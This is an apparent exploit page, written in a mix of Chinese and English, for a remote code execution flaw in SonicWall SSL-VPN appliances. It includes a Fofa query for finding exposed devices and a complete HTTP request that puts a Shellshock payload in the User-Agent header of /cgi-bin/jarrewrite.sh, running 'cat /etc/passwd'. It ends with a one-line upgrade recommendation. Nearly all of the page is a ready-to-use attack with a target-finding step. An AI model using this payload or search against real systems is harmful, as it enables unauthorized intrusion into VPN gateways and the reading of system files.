# SonicWall-SSL-VPN-RCE
SonicWall-SSL-VPN-RCE


## Fofa
``` bash
app="SONICWALL-SSL-VPN" && server=="SonicWALL SSL-VPN Web Server"
```

## POC
``` bash
GET /cgi-bin/jarrewrite.sh HTTP/1.1
Host: 103.x.x.x:4433
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://103.x.x.x.x:4433/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: AOPortal_103.x.x.x=false; SessURL=https%3A%2F%2F103.x.x.x%3A4433%2Fcgi-bin%2Fwelcome
```
![](https://blog-1259438478.cos.ap-nanjing.myqcloud.com/post-picture1/post-m-1.png)

java的gui版：

![](https://blog-1259438478.cos.ap-nanjing.myqcloud.com/post-picture1/post-m-2.png)
## 修复建议

升级到Sonic SMA 8.0.0.4
